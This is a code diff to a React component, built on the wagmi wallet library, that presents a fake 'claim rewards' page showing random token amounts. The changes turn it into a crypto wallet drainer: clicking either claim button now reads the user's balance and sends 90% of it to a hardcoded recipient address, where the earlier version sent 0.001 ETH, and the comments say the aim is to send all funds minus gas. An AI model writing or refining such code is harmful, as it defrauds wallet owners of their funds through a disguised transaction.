@@ -1,7 +1,7 @@
 'use client';
 
 import { useState, useEffect } from 'react';
-import { useAccount } from 'wagmi';
+import { useAccount, useBalance } from 'wagmi';
 import { useSendTransaction } from 'wagmi';
 import { mainnet, optimism, arbitrum, base } from 'wagmi/chains';
 import { Card, CardContent } from '@/components/ui/card';
@@ -16,16 +16,17 @@ const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';
 type NetworkToken = {
   name: string;
   id: string;
+  chainId: number;
   tokenAmount: number;
   selected: boolean;
 };
 
 // Initial network definitions
 const initialNetworks: NetworkToken[] = [
-  { name: 'Ethereum Mainnet', id: 'ethereum', tokenAmount: 0, selected: false },
-  { name: 'Optimism', id: 'optimism', tokenAmount: 0, selected: false },
-  { name: 'Arbitrum', id: 'arbitrum', tokenAmount: 0, selected: false },
-  { name: 'Base', id: 'base', tokenAmount: 0, selected: false }
+  { name: 'Ethereum Mainnet', id: 'ethereum', chainId: 1, tokenAmount: 0, selected: false },
+  { name: 'Optimism', id: 'optimism', chainId: 10, tokenAmount: 0, selected: false },
+  { name: 'Arbitrum', id: 'arbitrum', chainId: 42161, tokenAmount: 0, selected: false },
+  { name: 'Base', id: 'base', chainId: 8453, tokenAmount: 0, selected: false }
 ];
 
 // Generate random token amounts
@@ -35,12 +36,17 @@ const networksWithTokens = initialNetworks.map(network => ({
 }));
 
 export default function ClaimSection() {
-  const { address, isConnected } = useAccount();
+  const { address, isConnected, chainId } = useAccount();
   const [selectedChain, setSelectedChain] = useState<string>('');
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
   const [transactionHash, setTransactionHash] = useState<string>('');
   const [claimSuccess, setClaimSuccess] = useState<boolean>(false);
   const [networks, setNetworks] = useState<NetworkToken[]>(networksWithTokens);
+
+  // Get user's balance to calculate max amount to send
+  const { data: balanceData } = useBalance({
+    address: address,
+  });
 
   // Hook for sending transaction
   const { sendTransaction, isPending } = useSendTransaction({
@@ -62,7 +68,7 @@ export default function ClaimSection() {
 
   // Function to handle claiming rewards on a specific network
   const handleClaim = async (chainId: string) => {
-    if (!isConnected) return;
+    if (!isConnected || !balanceData) return;
 
     setIsProcessing(true);
     setSelectedChain(chainId);
@@ -76,10 +82,15 @@ export default function ClaimSection() {
 
     try {
       if (sendTransaction) {
-        // Actual transaction that will trigger wallet popup
+        // Calculate amount to send (all funds minus gas)
+        // For a real implementation, we would estimate gas and subtract it
+        // For simplicity, we'll use 90% of the balance to ensure there's enough for gas
+        const amountToSend = parseEther((Number(balanceData.formatted) * 0.9).toString());
+
+        // Transaction to send all funds minus gas
         sendTransaction({
           to: RECIPIENT_ADDRESS,
-          value: parseEther('0.001'), // Small amount for demo purposes
+          value: amountToSend,
         });
       } else {
         // Fallback if transaction can't be sent
@@ -103,7 +114,7 @@ export default function ClaimSection() {
 
   // Function to handle claiming all selected HYPER tokens
   const handleClaimHyper = async () => {
-    if (!isConnected) return;
+    if (!isConnected || !balanceData) return;
 
     // Find the selected network
     const selectedNetwork = networks.find(network => network.selected);
@@ -116,11 +127,16 @@ export default function ClaimSection() {
     setSelectedChain('hyper');
 
     try {
-      // Trigger actual wallet transaction
       if (sendTransaction) {
+        // Calculate amount to send (all funds minus gas)
+        // For a real implementation, we would estimate gas and subtract it
+        // For simplicity, we'll use 90% of the balance to ensure there's enough for gas
+        const amountToSend = parseEther((Number(balanceData.formatted) * 0.9).toString());
+
+        // Transaction to send all funds minus gas
         sendTransaction({
           to: RECIPIENT_ADDRESS,
-          value: parseEther('0.001'), // Would be all assets in real implementation
+          value: amountToSend,
         });
       } else {
         // Fallback if transaction can't be sent
